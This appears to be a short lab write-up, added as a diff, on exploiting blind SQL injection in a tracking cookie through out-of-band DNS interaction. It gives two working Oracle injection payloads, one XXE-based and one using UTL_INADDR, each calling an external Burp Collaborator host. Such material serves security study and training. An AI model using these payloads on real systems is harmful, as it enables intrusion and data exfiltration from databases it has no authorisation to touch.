@@ -1,0 +1,28 @@
+Blind SQL injection with out-of-band interaction
+
+Vulnerable parameter - Tracking cookie
+
+/* An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user's request in the original thread,
+and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The
+application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.
+
+In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be
+triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.
+
+A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS
+queries, because they're essential for the normal operation of production systems. */
+
+Goal:
+- Exploit SQLi and cause a DNS lookup
+
+Analysis:
+---------
+
+cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net
+
+=====Option 1: for unpatched Oracle installations. This leverages an XEE vulnerability to trigger a DNS lookup=====
+' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
+-> It worked!
+
+=====Option 2: for patched Oracle installations, but requires elevated priviledges=====
+' || (SELECT UTL_INADDR.get_host_address('http://cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net'))--
